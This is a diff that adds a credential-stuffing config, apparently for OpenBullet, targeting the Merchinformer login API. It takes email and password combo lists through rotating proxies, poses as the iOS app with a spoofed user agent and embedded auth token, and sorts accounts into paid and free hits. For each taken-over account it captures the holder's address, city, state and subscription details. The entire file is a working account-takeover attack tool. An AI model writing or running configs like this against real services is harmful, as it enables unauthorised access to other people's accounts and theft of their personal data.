@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "Merchinformer iOS Api (CF BYPASS)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-16T14:44:51.7260987+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://members.merchinformer.com/api/login" 
+  CONTENT "auth=b034154882ac539e97c5d017dd635e54&email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: members.merchinformer.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: MerchInformer/1.1 (com.app.merchinformer; build:9; iOS 15.3.1) Alamofire/4.7.3" 
+  HEADER "Accept-Language: en-CA;q=1.0" 
+  HEADER "Content-Length: 96" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false," 
+    KEY "These credentials do not match our records." 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true,\"active_sub\":true" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "{\"success\":true,\"active_sub\":false" 
+
+#sub PARSE "<SOURCE>" LR "active_sub\":" "," CreateEmpty=FALSE -> CAP "Subscribe" 
+
+#type PARSE "<SOURCE>" LR "type\":\"" "\"" CreateEmpty=FALSE -> CAP "Type" 
+
+#city PARSE "<SOURCE>" LR "city\":\"" "\"" CreateEmpty=FALSE -> CAP "City" 
+
+#State PARSE "<SOURCE>" LR "state\":\"" "\"" CreateEmpty=FALSE -> CAP "State" 
+
+#Address PARSE "<SOURCE>" LR "address\":\"" "\"" CreateEmpty=FALSE -> CAP "Address" 
+
+#asin_limit PARSE "<SOURCE>" LR "asin_limit\":" "," CreateEmpty=FALSE -> CAP "Asin_Limit" 
+
+#asin_current PARSE "<SOURCE>" LR "asin_current_count\":" "," CreateEmpty=FALSE -> CAP "Asin_Current" 
+
+#phrase_limit PARSE "<SOURCE>" LR "phrase_limit\":" "," CreateEmpty=FALSE -> CAP "Phrase_Limit" 
+
+#phrase_current PARSE "<SOURCE>" LR "phrase_current_count\":" "," CreateEmpty=FALSE -> CAP "Phrase_Current" 
+
+#track_limit PARSE "<SOURCE>" LR "trademark_track_limit\":" "," CreateEmpty=FALSE -> CAP "Track_Limit" 
+
+#Track_Current PARSE "<SOURCE>" LR "trademark_track_current_count\":" "," CreateEmpty=FALSE -> CAP "Track_Current" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
